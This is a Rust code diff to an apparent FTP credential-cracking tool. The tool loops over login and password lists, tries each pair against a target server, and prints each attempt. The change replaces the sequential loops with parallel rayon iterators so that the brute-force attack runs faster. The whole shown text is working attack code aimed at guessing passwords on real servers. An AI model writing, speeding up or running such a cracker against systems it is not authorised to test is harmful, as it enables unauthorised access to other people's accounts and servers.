@@ -1,6 +1,6 @@
 use anyhow::{Error, Ok};
 use core::result::Result::Ok as Okb;
-// use rayon::prelude::*;
+use rayon::prelude::*;
 use std::env;
 use std::fs::File;
 use std::io::{BufRead, BufReader};
@@ -26,16 +26,17 @@ fn check_arguments(args: &Vec<String>) -> Result<(), Error> {
 
 fn cracker(logins: &str, passwords: &str, target: &str) -> Result<(), Error> {
     let (logins, passwords) = parse_files(logins, passwords)?;
-    for login in &logins {
-        for password in &passwords {
-            caller(login, password, target)?;
-        }
-    }
+    logins.into_par_iter().for_each(|login| {
+        passwords
+            .clone()
+            .into_par_iter()
+            .for_each(|password| caller(&login, &password, target).unwrap())
+    });
     Err(error::CrackerError::CredentialsNotFound.into())
 }
 
 fn caller(login: &str, password: &str, target: &str) -> Result<(), Error> {
-    println!("trying: {}:{} - {}", login, password, target);
+    println!("      trying: {}:{} - {}", login, password, target);
     let mut ftp_stream = FtpStream::connect(target)?;
     match ftp_stream.login(login, password) {
         Err(_) => {}
